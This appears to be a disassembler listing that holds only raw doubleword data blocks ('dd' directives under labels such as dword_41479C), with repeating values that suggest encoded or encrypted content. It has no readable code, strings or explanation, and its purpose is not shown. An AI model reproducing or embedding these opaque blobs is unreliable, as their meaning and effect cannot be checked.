		dd 0EF6724h, 9CB8D276h,	2B7E10EEh, 0D710AB2Ch, 0F5752F78h
		dd 0FA0256BCh, 10EE9970h, 0A2D710ABh, 2B7C5BB1h, 0EFF900h
		dd 6D907F3Eh, 7F6D907Fh, 907F6D90h, 6D907F6Dh, 0EBFDEC6Eh
		dd 56FD00h, 0CE00EFFCh,	62AA562Fh, 68E7D97Ch, 0ED013F05h
		dd 0AB70AB1Ch, 0FFBFF124h, 0FC63A3E8h, 0CB718BFFh, 0EFF91Ch
		dd 0E5245B76h, 85FD00EBh, 85AC00h, 700185ABh, 87D924BBh
		dd 10EE2DF0h, 0FD0287AFh, 4E1580EFh, 83EFFD99h,	256C739h
		dd 0EE9CB8FAh, 81B1A210h, 0FD04EF39h, 7F6DC3EFh, 907F6D90h
		dd 6D907F6Dh, 7F6D907Fh, 2071181h, 0AB53EFFDh, 0EFB1B9B8h
		dd 0C0DCFD00h, 9D249370h, 6B75AB1Ch, 0EED124h, 0D94462FDh
		dd 0AB3B508Bh, 0C7899924h, 6168CBB9h, 10FD00EFh, 18E0D15h
		dd 0D99C64EDh, 0EFFD0217h, 0F4CB718Dh, 9500EFFCh, 0EFFD01EFh
		dd 0A107AE51h, 0CEFF1003h
dword_41479C	dd 0E339833Dh, 10CBA989h, 0F124AB70h, 0FBD95466h, 24BB7450h
		dd 0D94C62E1h, 0CBA989FBh, 247B7620h, 0FD00ECFDh, 0CBB9C7BEh
		dd 0EFED14h, 558264FDh,	0BFFD00EFh, 649BE8FFh, 0B18BFFFCh
		dd 5B7014CBh, 0EE0924h,	0D98C66FDh, 0EFFD01E7h,	0EFF5B9h
		dd 0D9BC62FDh, 0EFFD01E3h, 0A10758F3h, 70FF1000h, 0EE2D247Bh
		dd 8466FD00h, 0FD01EFD9h, 0FA0252EFh, 10EE9CF4h, 19246B76h
		dd 66FD00EEh, 1EBD984h,	24E8EFFDh, 6402FF12h, 3EFD98Ch
		dd 0C88BEFFDh, 0FFFC6117h, 90CB698Dh, 7500EFFCh, 0EED1246Bh
		dd 89BDFD00h, 0FC34CB71h, 6B3A00EFh, 0EE6924h, 0FD00AFFDh
		dd 642BFFEFh, 177D984h,	698BEFFDh, 0EFFC9CCBh, 0FB4400h
		dd 0FCE8EFFDh, 66FD01D5h, 1DBD984h, 0EDB9EFFDh,	0DCFD00EFh
		dd 249370C0h, 70AB1CDDh, 28DD24ABh, 40CFD944h, 0AD00EFFDh
		dd 0AB76D610h, 5464CD24h, 0E9B9DBD9h, 7FD00EFh,	0EEC4CCh
		dd 2D7450BDh, 6B7410EEh, 0EE7124h, 2C96CFDh, 7B70C0DCh
		dd 0EE8524h, 0AAE1DFDh,	87042B3Eh, 10EE14CCh, 0A8B2E76h
		dd 63CFA64h, 8B4A0E02h,	0FEE16C35h, 0DA76A41Ch,	10EE9E4Ch
		dd 0C1246370h, 0BEFD00EEh, 0CC552BFFh, 7E10EE14h, 3D78082Bh
		dd 8462EF75h, 0FD01D7D9h, 3EE968EFh, 0FFBFED01h, 0F5C46C2Bh
		dd 0B7D98C62h, 6AEFFD01h, 1553BEDDh, 1002FD27h,	85E33983h
		dd 702F9A3Dh, 0EEA5247Bh, 0B887FD00h, 0AF10EE18h, 6B70D610h
		dd 0EE9D24h, 0F5C46CFDh, 0FD88C06Ah, 58CB718Dh,	9500EFFCh
		dd 0FFFCD1E3h, 83390251h, 718BE739h, 0EFFFFCCBh, 24BB7000h
		dd 0FC30879Dh, 7AF00EFh, 0EFDD3Ch, 7C5BB1A2h, 0EFFFE82Bh
		dd 907F3E00h, 0FD00E415h, 0EFEBE9EFh, 907FFD00h, 6D907F6Dh
		dd 0EE1F9D56h, 50CA0210h, 6D10EE9Fh, 7F6D907Fh,	0F9FD68h
		dd 0C42107EDh, 2CA400EEh, 907F6D90h, 0FCE27244h, 0A3D8FFFFh
		dd 90FFFC62h, 6D907F6Dh, 0EFFD0B07h, 0F91400h, 6D90EFFDh
		dd 7F6D907Fh, 10D61B9h,	0A92510EDh, 7FED018Dh, 907F6D90h
		dd 0FD16AF95h, 0D71CE8FFh, 0C3B6FD01h, 6D907F6Dh, 0EE1F9C56h
		dd 80CA0210h, 6D10EE9Fh, 7F6D907Fh, 0A18B026Ah,	0FD00EFFDh
		dd 0EEACA187h, 2057AD10h, 9900EF59h, 0EFFD2566h, 0D107FD00h
		dd 0AE00EEC5h, 10AA56BAh, 18E5915h, 0FD6ABFEDh,	0F0F2FF87h
		dd 0A8FA0200h, 7610EE9Ch, 0EF7D681Fh, 0FFB9FD00h, 0FC6143E8h
		dd 0FA0256FFh, 10EE9CE0h, 0FD00AF44h, 623D33EFh, 13ED9BCh
		dd 79C6EFFDh, 0EFFCD0CBh, 0AB1CFD00h, 44AA449Bh, 0EFFD00AFh
		dd 0BC623D33h, 0FD0022D9h, 0CB79C6EFh, 0EFFDCCh, 9BAB1CFDh
		dd 0FA02AA44h, 10EE9E58h, 0FD00EF95h, 87FD6AEDh, 10EE2C18h
		dd 9E44FA02h, 2F7810EEh, 0FFBFFA74h, 0FC63BFE8h, 10FC6AFFh
		dd 18E4D15h, 0D94C62EDh, 0FB47E8FFh, 384FFD00h,	3A10EE1Bh
		dd 4BC5246Bh, 0EFFD00h,	3D84EFFDh, 0AB70399Bh, 8C62ED24h
		dd 0FD053BD9h, 6A1550EFh, 8DEFFD87h, 0F8D4CB71h, 6B3B00EFh
		dd 4BC524h, 5CE8EEFDh, 62FD0068h, 53BD98Ch, 79C6EFFDh
		dd 0EF5938CBh, 0AD07FD00h, 7600EF7Ah, 0EE9CB4F2h, 109510h
		dd 0C168EFFDh, 7ED0109h, 0FF1004F8h, 9FF0C276h,	2B7E10EEh
		dd 24637004h, 0FD00EC25h, 3A0251BFh, 0E953C88Bh, 3983FFFCh
		dd 0CB698DE3h, 0EFFED4h, 0ED24A370h, 537052B9h,	0EC2124h
		dd 0EB3207FDh, 2F7900EFh, 65780Fh, 268EFFDh, 87FD00EFh
		dd 10EE1BBCh, 2F94415h,	0EB398310h, 246B7050h, 0FD00EB21h
		dd 6428FFBFh, 1063D35h,	0F1C46CEDh, 3BD98C62h, 8DEFFD04h
		dd 0F9D4CB41h, 0BEAB00EFh, 18CBB18Dh, 0FD150415h, 9A3D84EFh
		dd 109547h, 0C168EFFDh,	7ED0108h, 0FF100468h, 70042B7Eh
		dd 0ED25247Bh, 52BFFD00h, 0C88B3A02h, 0FFFCE92Bh, 8DE33983h
		dd 0FFD4CB79h, 0A37000EFh, 50B9ED24h, 21245370h, 7FD00EDh
		dd 0EFE8A8h, 790F2F79h,	1002FFC6h, 85FD6Ah, 0FD04D795h
		dd 85FD6AEFh, 24A37000h, 0E2EA07D9h, 3C0200EFh,	0D310158Bh
		dd 0B18D2AD6h, 62AD10CBh, 13BD994h, 0AF51EFFDh,	10064F07h
		dd 98E276FFh, 7E10EE1Fh, 6B700C2Bh, 0EF3124h, 0D99462FDh
		dd 0EFFD013Fh, 51BFAA56h, 0DD24AB70h, 637050BDh, 0EA1124h
		dd 796207FDh, 637000EFh, 0EA2924h, 0D98429FDh, 0EFFDA4D7h
		dd 4C62AC02h, 84E8FBD9h, 29FD00F0h, 70BD984h, 201EFFDh
		dd 0CB698D3Ch, 0EFFDCCh, 950085AFh, 0EFE200ECh,	6153E8FFh
		dd 0D8BFFFCh, 6B766485h, 0EF3D24h, 0E8FFBFFDh, 0FFFC612Fh
		dd 0EE0968h, 2F864FDh, 0EE9CFCFAh, 75197810h, 88FF6AE0h
		dd 0CB718D2Bh, 0EFF8D4h, 0C5246B3Bh, 0EFFD004Bh, 6A02E8h
		dd 35306FDh, 0A370FF10h, 7107ED24h, 0AB00EFE1h,	8E1D3564h
		dd 0D610ED01h, 29246370h, 29FD00EAh, 0A4D7D984h, 1500EFFDh
		dd 0EFFD853Bh, 1510FF6Ah, 0ED018E4Dh, 0FA020085h, 10EE9CC4h
		dd 2BFFEF97h, 0FFD94C62h, 38CB79C7h, 200EF59h, 702FF10h
		dd 0EFEE6Ch, 0CD246376h, 0B0FD004Bh, 0C0DCA05Eh, 0F0898BA6h
		dd 0EFFD00EFh, 0A4C33981h, 0F9C2EFFDh, 7F6D90EFh, 907F6D90h
		dd 6D907F6Dh, 7F6D907Fh, 0FFF31183h, 0FC638BE8h, 85FD6AFFh
		dd 0FFEF9700h, 0FC614FE8h, 0FA0250FFh, 10EE9E60h, 0FD6AEF97h
		dd 0E7D94462h, 0FFBFFD6Ah, 0FC63B3E8h, 0CBB98BFFh, 762F7824h
		dd 0FFF86CF2h, 0A3760A98h, 0D66DD24h, 0ED02EEB5h, 0EFFD0157h
		dd 1C2B7E00h, 6D00E33Fh, 0B9C9EC6Ch, 4EF9557h, 6CE8EFFDh
		dd 64FD01DAh, 1EF44F0h,	3D33EFFDh, 440EFE64h, 745F8FB2h
		dd 0A9888A4Ch, 0BB7521CBh, 4467D524h, 0B988F0D9h, 0AB7524CBh
		dd 4467D424h, 0D2B2C3D9h, 0FBD94467h, 4CCBB98Bh, 0DD24A375h
		dd 0CCD94C67h, 37CBB188h, 0EB24A375h, 0D6D95467h, 3ACBA988h
		dd 0C624BB75h, 0ABD95464h, 10CBB18Dh, 0B98DBEADh, 0BFAF24CBh
		dd 13EDD68h, 0B9C6B9EDh, 29A634CBh, 49DAD944h, 0CB24AB3Bh
		dd 0CBB9C681h, 4429933Ah, 3B53D2D9h, 87C324ABh,	3FCBB9C6h
		dd 0D9442992h, 0AB3B63ADh, 0C69ABE24h, 0A045CBB9h, 0A9D94429h
		dd 24AB3B0Dh, 0B9C6E5BAh, 29A848CBh, 52A6D944h,	0B724AB3Bh
		dd 0CBB9C6A3h, 4429C04Bh, 3B66A3D9h, 86B024ABh,	4ECBB9C6h
		dd 0D9442991h, 0AB3B3ABFh, 0C6EFA924h, 0F028CBB9h, 0C6D94429h
		dd 24AB3B0Ah, 0B9C6A7D7h, 29922BCBh, 4BC2D944h,	0D224AB3Bh
		dd 0CBB9C696h, 4429C030h, 200DED9h, 0EE9E4CFAh,	24A37610h
		dd 0E1C46C9Dh, 0EF970085h, 85FF6Ah, 0FD68ED97h,	0BEBD00EFh
		dd 6173E8FFh, 0A98DFFFCh, 0EF9708CBh, 56BD058Bh, 9CB8FA02h
		dd 0B9AD10EEh, 0E8FA0257h, 0AA10EE9Ch, 8E1D1510h, 5EB0ED01h
		dd 3E342B7Eh, 0EDC1EC6Eh, 6ABCFD00h, 0D94462FDh, 0BFD66AD3h
		dd 1510FD6Ah, 0ED018CC9h, 9D4F6F5Eh, 11CBB188h,	0EE24A375h
		dd 0F4D94C67h, 2BCBB188h, 0C924A370h, 0BB75575Fh, 5467ED24h
		dd 0A988CED9h, 0BB7522CBh, 68BED524h, 0FD02EFFBh, 0E3D95462h
		dd 10CBB988h, 0E224AB75h, 0B34E0085h, 68BD93B0h, 7D00EFFFh
		dd 0F7D94429h, 24AB3B53h, 0B9C6A0E4h, 29BB1ACBh, 54F4D944h
		dd 0E024AB3Bh, 0CBB9C6AEh, 4429AF1Eh, 7545F0D9h, 29DD24B3h
		dd 4DCED944h, 0DF24AB3Bh, 0CBB9C686h, 44299E23h, 3B73C9D9h
		dd 89D524ABh, 29CBB9C6h, 0D95C6789h, 0CBB9C6C5h, 4467942Ch
		dd 0B9C6C2D9h, 29992ECBh, 77DFD944h, 0CC24AB3Bh, 0CBA1889Ch
		dd 24AB3B32h, 0B9C6ACCEh, 298834CBh, 65D8D944h,	0C524AB75h
		dd 0D6D94429h, 24AB3B74h
dword_414F9C	dd 0B9C6B9C7h, 29983BCBh, 73D2D944h, 0C324AB3Bh, 0CBB98886h
		dd 24B37540h, 0D94429BCh, 0AB3B52ADh, 889ABE24h, 3B44CBB9h
		dd 0EFB824ABh, 60C3E8FFh, 3D85FFFCh, 62AE75B4h,	56DBD944h
		dd 0D98C62ADh, 0EFFD01AFh, 13ED168h, 0E8FFBEEDh, 0FFFC63A3h
		dd 8DE33983h, 0FC3CCB69h, 64AD00EFh, 52D7D944h,	0FD6AEE97h
		dd 0EE1FA487h, 1510AD10h, 0ED018FCDh, 0A376F064h, 0FFBEC924h
		dd 0FC60CFE8h, 0B10B85FFh, 85F574h, 9CFCFA02h, 2B7C10EEh
		dd 0EFFF3Ch, 6D907F3Eh,	7F6D907Fh, 907F6D90h, 6D907F6Dh
		dd 77C88BB9h, 57FFFC61h, 9CFCD276h, 279510EEh, 0FFEFFD00h
		dd 2C4C872Ah, 2E1510EEh, 83EFFDB9h, 3D85EB39h, 0EF97119Bh
		dd 85FD6Ah, 0FD1BCF95h,	85FD6AFFh, 68390200h, 0ED013EC1h
		dd 0EF449F07h, 42B7E00h, 3B752F78h, 87AD50BFh, 10EFE620h
		dd 2BFFBFADh, 7F6DB804h, 907F6D90h, 6D907F6Dh, 6E118BBAh
		dd 0E9E1ECh, 0AA56BCFDh, 0EE2CB887h, 0FFEF9710h, 0FC619FE8h
		dd 6A0D8BFFh, 50E888F6h, 9C74FA02h, 390210EEh, 63A3E08Bh
		dd 0D8BFFFCh, 9C168B9h,	0D310ED01h, 0FD806970h,	87AD00EFh
		dd 10EE1BBCh, 738D3C02h, 0EFFD01EFh, 0E7D39551h, 2EFFFFFCh
		dd 0EE7D9662h, 68BDFD00h, 0ED010A45h, 6970D310h, 0EFFCC0h
		dd 14CC87ADh, 3C0210EEh, 2EF738Dh, 9551EFFDh, 0FFFCE517h
		dd 96652EFFh, 0FD00EBA1h, 67CDC46Ch, 1063515h, 0BC8665EDh
		dd 4DFD00EDh, 10EE18B0h, 0FF406177h, 0E27500EFh, 10EE1B38h
		dd 0FF487976h, 0FA7400EFh, 10EE14BCh, 0FF4C6976h, 2F5E00EFh
		dd 8BFFFCE9h, 0FD02BF73h, 2BF089EFh, 8BFFFCE9h,	0FD02AB6Bh
		dd 5BE889EFh, 66FFFCE5h, 0F9546176h, 2FCE00EFh,	10E27466h
		dd 9B10EE17h, 2F78C164h, 0BC55E77Eh, 7010EE1Ah,	0EFFF5461h
		dd 31649B00h, 9B022E7Eh, 2D7E3266h, 0F19AB502h,	0FD00AF44h
		dd 623D33EFh, 0FF1514BDh, 15852902h, 0EF02FF15h, 0AB8956F3h
		dd 0FCE7D395h, 94168FFh, 6845ED01h, 0ED0109C1h,	15158562h
		dd 0B08702FFh, 0AD10EE2Ch, 2B7ED310h, 0E8627014h, 0ACFF1007h
		dd 0EF970085h, 6197E8FFh, 0D8BFFFCh, 8E811510h,	0B7D2ED01h
		dd 8800EFFDh, 0FA0256E0h, 10EE9CE0h, 0E8FFEF97h, 0FFFC616Fh
		dd 13E5D68h, 450A07EDh,	2B7E00EFh, 742F7804h, 950085F0h
		dd 0FFFCD16Fh, 616BE8FFh, 0C080FFFCh, 0FFFCE55Fh, 0C76AF201h
		dd 7000EFFCh, 1000F47Ah, 1EB95FFh, 9752EFFDh, 23E8FFEFh
		dd 8BFFFC61h, 0FC63DBC8h, 62FD6AFFh, 0FF110585h, 0AD2B8502h
		dd 39020085h, 0FE17708Dh, 8D681002h, 0BEED013Eh, 6167E8FFh
		dd 408DFFFCh, 1002FE17h, 33103483h, 595623Dh, 1D02FF11h
		dd 493E0AAEh, 0F46A70h,	0BDACFF10h, 0DCFA0250h,	7E10EE9Fh
		dd 2F780C2Bh, 8D62D874h, 2FF1209h, 10AC0685h, 18E7115h
		dd 59562EDh, 8502FF11h,	0F46A7003h, 0AFFF1000h,	7FE8FFBFh
		dd 6AFFFC61h, 198D62FDh, 8502FF16h, 85AC0Bh, 688D3902h
		dd 1002F90Bh, 0FC1F788Dh, 95521002h, 0FFFCD18Bh, 8D3C0250h
		dd 2F90B70h, 3688D10h, 511002FBh, 0FCD1B795h, 3C0252FFh
		dd 6157E08Bh, 788DFFFCh, 1002FC1Fh, 85F73983h, 3A099A3Dh
		dd 0EFFDFCAAh, 3804FD00h, 1F06270h, 10ACFF10h, 461F76D3h
		dd 7E36EB70h, 13D9032Fh, 1C052E8h, 0ABFC64FDh, 1F688DB8h
		dd 6A1002FCh, 0FD6ABD02h, 289B0085h, 0FFEFFD07h, 0FC617BE8h
		dd 138089FFh, 0FB03788Dh, 3D851002h, 10CE049Ah,	8D62C8EBh
		dd 2FF1411h, 642EFFBEh,	462BBF0h, 0FEC06CCBh, 8615FCCBh
		dd 8BEFFC2Fh, 7057B901h, 1006EC7Ah, 521097FFh, 0FD6AEF97h
		dd 0EFFAC789h, 94FA0200h, 7610EE9Ch, 0EF97FC9Ah, 0FE17788Dh
		dd 0AD561002h, 1004CB07h, 8DEF97FFh, 2FE1770h, 7AC5710h
		dd 0FF1004BCh, 688DE297h, 1002FE17h, 0AD07AF56h, 97FF1004h
		dd 17788DCFh, 571002FEh, 49E07ADh, 2B7EFF10h, 6AEF9730h
		dd 950085FDh, 0FFFD1C4Fh, 85FD6Ah, 9C98FA02h, 0EF9710EEh
		dd 0FF1A02E8h, 25A56202h, 0B002FF16h, 0E564A65Eh, 0FD6A2CA0h
		dd 1008EB07h, 0FFEF97FFh, 0FC616FE8h, 7F6D90FFh, 33B9A853h
		dd 0C08BB826h, 0FFFC6183h, 531E7653h, 0FBC7BCAEh, 0FFFC6437h
		dd 53BC2AFFh, 0BB89BCAEh, 662AFFCBh, 5E66D546h,	0E15E66D1h
		dd 28DD5E66h, 307F946h,	0A388EFFDh, 0AAA388ABh,	0BDDF838Dh
		dd 0FD00EFFFh, 0BFF94664h, 1C14EE8h, 742085FDh,	4615D8A8h
		dd 89EFFC2Eh, 0F94E64FAh, 0C163E8BEh, 2085FD01h, 15E0A874h
		dd 0EFFC2E7Bh, 83E7BA89h, 3A83FF39h, 23884DEBh,	33A9BB8Dh
		dd 0A2C8642Fh, 0BE741166h, 8BE7404h, 740CBE74h,	289B10BEh
		dd 66EFCC00h, 0FC48A93Ah, 0A5BBC7EFh, 0EFE240h,	0A44EA93Ah
		dd 89FD00E9h, 41BDBBC7h, 0A38989FDh, 0A93A66BBh, 66EFFF56h
		dd 0BD58A93Ah, 0B13B8BEEh, 902CA65Dh, 6D907F6Dh, 7F6D907Fh
		dd 907F6D90h, 15F164ABh, 0EFFD00F7h, 8CBB9F6h, 0AB099BFCh
		dd 0EED32107h, 42B7E00h, 3F5E2976h, 7F6D00EBh, 8BB9A853h
		dd 0BB8AB80Ch, 37FBC7ABh, 84FFFC64h, 76499B3Dh,	10AD18A9h
		dd 18BB515h, 0E54E64EDh, 0ABE8FFBEh, 8BFFFC64h,	0FC64AFD0h
		dd 0DF838DFFh, 0EFFFBBh, 761764FDh, 0CF9718A9h,	0D510AD52h
		dd 0B604287Eh, 0A176EF9Ah, 1510AC18h, 0ED018BC1h, 85D15664h
		dd 1510AFFFh, 0ED018E95h, 6BB84665h, 8BDC89C0h,	250AFBBh
		dd 0EE9938FAh, 34C27610h, 7010EE99h, 0ED463091h, 8BEFFD00h
		dd 0BD5664F2h, 0BDAC2085h, 0C76C28FFh, 1275A4F9h, 0BFBD4664h
		dd 64DFE8FFh, 838DFFFCh, 0EFFFBBDFh, 4F64FD00h,	92E8BE25h
		dd 64FD01C2h, 6707AF17h, 7600EED0h, 7ADE0A8h, 0EED05Eh
		dd 0AC08A076h, 0EED05507h, 102B7E00h, 0B604287Eh, 0B976D49Ah
		dd 0E0D27624h, 0AF10EE9Ch, 0A976D710h, 0D710AD28h, 0AC2CA176h
		dd 0B1A2D710h, 902CA65Dh, 6D907F6Dh, 7F6D907Fh,	571E7656h
		dd 7944A977h, 7ED752Fh,	0EFFDD0h, 0FA752F79h, 0B13D33B0h
		dd 8BEFF9C2h, 780CCB81h, 0B0FA7510h, 0C2B13D33h, 0BB8BEFF9h
		dd 0FA0250C7h, 10EE9C64h, 9724A176h, 0FA025110h, 10EE9CC0h
		dd 7404B976h, 0F3BB8BF8h, 86AB765Fh, 0F9C2B1F5h, 7F6D90EFh
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 8A367653h, 3D84AABEh
		dd 0AE150D9Ah, 84EFFD01h, 0A6049A3Dh, 64FD082Dh, 55E3D944h
		dd 3D8502CEh, 0A4764E99h, 8BB8AB04h, 898BCFBEh,	3E7614CBh
		dd 7C64DD6Ah, 14C1FF7Eh, 6458F3EDh, 30E7ECAh, 0BE8B4B0Eh
		dd 0AFAE8BCFh, 386CB18Bh, 0E8FFBDACh, 0FFFC6487h, 8BCF8E8Bh
		dd 0FCB8EBB6h, 0ECFD00EFh, 8929D6E9h, 0B98BCFBEh, 7C618CBh
		dd 5EB04472h, 0A6015FA0h, 7FFD082Dh, 907F6D90h,	6D907F6Dh
		dd 64AA53BEh, 5CFA02F9h, 7810EE99h, 0B0FB752Fh,	59B43D32h
		dd 0D944623Eh, 0CBB9C7E7h, 0EFFD08h, 0F96ABFFDh, 0CB5D68B8h
		dd 85ED00h, 0E8FFEF97h,	0FFFC6177h, 8CBB18Bh, 0FF00EF95h
		dd 62FD6AEFh, 8DBEBB57h, 9552F7A2h, 0EFFDFF10h,	2CA87453h
		dd 9958FA02h, 2F7810EEh, 32B0FB74h, 3E59B43Dh, 987056BAh
		dd 0ED4030h, 0FB8BEFFDh, 85254E64h, 8BE77420h, 0F94764EBh
		dd 64F94266h, 892FCE0Eh, 0EB8BFFBCh, 64E94266h,	50E47606h
		dd 0A91510ACh, 6CED018Bh, 75A2F9C6h, 0E157642Ch, 0CF970B64h
		dd 3078B98Bh, 0E8FFBEADh, 0FFFC64BFh, 52C3AA8Bh, 9C60FA02h
		dd 0EC7610EEh, 4CFA0250h, 4D10EE99h, 0A8755EEEh, 5BB0A044h
		dd 6D902CA4h, 7F6D907Fh
		dd 57B9A853h, 0E8FF3676h, 0FFFC64C3h, 79A3D85h,	0CF5DB1A2h
		dd 623E5B2Fh, 251ED53h,	7600EFFDh, 0D57604A4h, 0C0DC148Bh
		dd 0E02063Ch, 6C308B44h, 0E16CF9C2h, 57F3A1FEh,	0EF97E59Ah
		dd 4362FD6Ah, 700085BBh, 87AD4084h, 0EF02FFh, 991510A8h
		dd 6AED018Bh, 5FE889C0h, 3D32B2A3h, 9C70C3B4h, 0ED4238h
		dd 0F38BEFFDh, 85255664h, 8BFE7420h, 0F94B64FBh, 64F94866h
		dd 892FCE16h, 0F38BFFBFh, 64E94166h, 0AA7616h, 0E8FFBFAFh
		dd 0FFFC648Fh, 4FEB3B83h, 0FCB03F88h, 0AC755EB0h, 0C3B4A045h
		dd 701C037Eh, 0BCFD24ABh, 6AB8AB55h, 970085FDh,	0FA0250EFh
		dd 10EE9E5Ch, 790F2F78h, 0EFFD006Eh, 30CB898Bh,	9C64D276h
		dd 0F27610EEh, 10EE9CC0h, 9950C276h, 937C10EEh,	32FE924h
		dd 0D175EFFDh, 0BED94E64h, 56642AFFh, 0AFFF85D5h, 0A176D310h
		dd 0EE451Ch, 3C2BEFFDh,	66E54E64h, 2085E146h, 0CD86AB76h
		dd 3A0251BFh, 419A3D85h, 0E924937Ch, 0EFFD0350h, 5462D674h
		dd 252FFD9h, 0EE9E6CFAh, 24AB7010h, 0E8FFBFEDh,	0FFFC6387h
		dd 85FD6Ah, 0E524A370h,	10AC0085h, 18CA115h, 88C06AEDh
		dd 0B2A35F7Ah, 83B43D33h, 0F9C2F339h, 0B2A35FEFh, 5B103583h
		dd 3F1C2B7Eh, 7F6D00EBh, 907F6D90h, 45681097h, 8BED01BEh
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 4464AC00h, 7656FBD9h
		dd 9B74501Eh, 5907F524h, 7600EF7Bh, 0CBB9C721h,	0EFFD10h
		dd 210628FDh, 7ED018Bh,	0EFFDE4h, 0C8742F79h, 0F7D94C62h
		dd 8BBEFC6Ah, 0D9442933h, 421579CFh, 8BEFFD86h,	7A160733h
		dd 0EF9700EFh, 85FD6Ah,	0DAE087ABh, 0EF9710EFh,	3107FD6Ah
		dd 7E00EF4Ch, 0A9741C2Bh, 24A37614h, 0A3C664F5h, 0EFF0898Bh
		dd 83EFFD00h, 0F9C2FF39h, 7F6D90EFh, 907F6D90h,	15F164ABh
		dd 0EFFD00F7h, 8CBB9F6h, 0AB099BFCh, 0EED47107h, 42B7E00h
		dd 3F5E2976h, 7F6D00EBh, 0D887026Ah, 9910EEACh,	0EFFD004Eh
		dd 898BAD00h, 0FD00EFD8h, 64AB51EFh, 249B74F1h,	210628F9h
		dd 29ED018Bh, 10D5505h,	0BB8BEFEDh, 0BF026AFBh,	18CBB9C7h
		dd 0FD00EFFDh, 8E3D1510h, 4E64ED01h, 89C96AEDh,	85EC8BE9h
		dd 8BFD0201h, 0D9442833h, 1002FFFFh, 852915FFh,	0B18BEFFDh
		dd 8BA308CBh, 0EFF089h,	3983EFFDh, 7F6DC3FFh, 907F6D90h
		dd 6681097h, 8BED01BEh,	0EFFDA1h, 7464BFFDh, 0EFFD00CAh
		dd 8BB9AC00h, 0A115100Ch, 6AED018Bh, 32FD88C0h,	0B18BB13Dh
		dd 669904CBh, 0EFFD0Dh,	0EDC46CFDh, 0D55A02Ch, 0C06BED01h
		dd 3D32FD89h, 0CBB18BB1h, 0D669904h, 0FD00EFFDh, 2CEDC46Ch
		dd 9907A16Ah, 7E00EED5h, 0AB74042Bh, 0C06AF924h, 0ED24AB3Ah
		dd 0EFFD00EFh, 0C864F474h, 2F99015h, 0DCFFEB10h, 24A376C0h
		dd 0ED4666F5h, 4DA3015Fh, 10EE1FA8h, 0FD0D6699h, 6CFD00EFh
		dd 902CEDC4h, 0A808037Eh, 0B8148BB9h, 0CCBB98Dh, 0B08B10CEh
		dd 937450FFh, 7C66ED24h, 0DCE8FBD9h, 6402FF14h,	7518C6F0h
		dd 0CE5EB0F4h, 2B7E5D2Fh, 4C643E08h, 0BC53E3D9h, 0C7DBE8BEh
		dd 0D864FD01h, 3B042B7Eh, 0A3767AECh, 0D164ED24h, 3C019470h
		dd 4A0E0206h, 0E16C378Bh, 76A41CFEh, 6AED24ABh,	40F08BC0h
		dd 0AE502276h, 0EF79E707h, 0F064AE00h, 0FC271A15h, 0EB3983EFh
		dd 5FB43B8Bh, 3983B2A3h, 9B76C3E7h, 0E8BCE924h,	0FD01C823h
		dd 64F9C46Ch, 5EB0A6C6h, 0F5C46CA0h, 7F6D902Ch,	907F6D90h
		dd 6D907F6Dh, 0E7D94464h, 4CBA98Bh, 8801177Eh, 0F57753FEh
		dd 5BF00680h, 0D8E8E788h, 2DFD006Ah, 4964FD08h,	1552BFEDh
		dd 1002FA37h, 90EFF5C2h, 6D907F6Dh, 0EE1FA84Fh,	742F7910h
		dd 898BB9E1h, 217608CBh, 0FF10E6E8h, 1FA84F02h,	2F7910EEh
		dd 0C86C0D75h, 0F9C2B102h, 103583EFh, 90EFF9C2h, 6D907F6Dh
		dd 0DC0C8BB9h, 0CA974C0h, 7404A974h, 0A97008A9h, 628AD10h
		dd 0ED018B19h, 8EA11510h, 0C664ED01h, 6D902CA3h, 7F6D907Fh
		dd 907F6D90h, 6D907F6Dh, 70C8BB9h, 0EFFD18h, 0F524AB0Bh
		dd 0B9F474EEh, 1C8DCE8h, 0F9C46CFDh, 2DA3C664h,	907FFD04h
		dd 76F164ABh, 0E93A04A9h, 10EE99E4h, 0F3742F78h, 0EF7D0087h
		dd 50EF9700h, 9C54FA02h, 297E10EEh, 1510AB10h, 0ED018EA5h
		dd 7F6DC3B1h, 907F6D90h, 248BBCACh, 9C7056BAh, 7466AB10h
		dd 0E8FFFFD9h, 0FFFC61A3h, 2507368Bh, 7600EFFCh, 64E52483h
		dd 502AFECBh, 0FD01C815h, 100583EFh, 0FFB9ED75h, 0FC61BFE8h
		dd 0DCA05EFFh, 0C2B6A6C0h, 898BEFF5h, 227614CBh, 8BB83C8Bh
		dd 14C1E786h, 6458F3EDh, 30E7EC8h, 0B68B4B0Eh, 663003E7h
		dd 4C64F54Bh, 251FFD9h,	0EE9C50FAh, 0C564A210h,	0A45BB2A3h
		dd 7FFD082Dh, 907F6D90h, 6D907F6Dh, 7F6D907Fh, 0D964AE51h
		dd 8E8DB9A8h, 9B7456FFh, 1510ED24h, 0ED018EB1h,	7A15CB64h
		dd 8BEFFD00h, 0C618CB91h, 0B9ED7607h, 61BFE8FFh, 0A05EFFFCh
		dd 0B6A6C0DCh, 8BEFF5C2h, 0FD860736h, 7C600EFh,	0CB64F476h
		dd 0FD009415h, 6A158BEFh, 8BAF89EDh, 308BEB8Eh,	64AAC164h
		dd 0C1F7D97Ch, 58F3ED14h, 0E7EC864h, 8B4B0E03h,	368BEB8Eh
		dd 0EFFD4307h, 8D2AD600h, 0AC50C1F1h, 3BE8FFB9h, 8BFFFC62h
		dd 898BE7BEh, 2B7E1CCBh, 892AD60Ch, 765FE7BEh, 0EFD3E824h
		dd 8BBFFD00h, 0FC060736h, 10AB00EFh, 18EAD15h, 0A3C564EDh
		dd 2DA45BB2h, 907FFD08h, 6D907F6Dh, 2CF14164h, 907F6D90h
		dd 6D907F6Dh, 7F6D907Fh, 85EBAC8Bh, 0CE039A2Fh,	0AE76C32Fh
		dd 0C32DD608h, 0AE08037Eh, 367657BAh, 0FF102EE8h, 0D94C6402h
		dd 9C353BF7h, 33B2A20Bh, 3983B43Dh, 0EFF9C2E7h,	0CCBB189h
		dd 0ED24AB3Ah, 0EFFD00EFh, 0CCB91DFh, 2108037Eh, 0EE99E8E2h
		dd 24F32010h, 9FD0FA02h, 2B7E10EEh, 25BD1508h, 158BEFFCh
		dd 0A3C0485h, 10EF950Ah, 9755EFFDh, 37E8FFEFh, 8BFFFC61h
		dd 74FF6A05h, 9AF12493h, 83B2A20Ch, 7E5B1035h, 0EB3F082Bh
		dd 0CB64AB00h, 2FF9C15h, 0EB8E8B10h, 0D164358Bh, 0E124AB74h
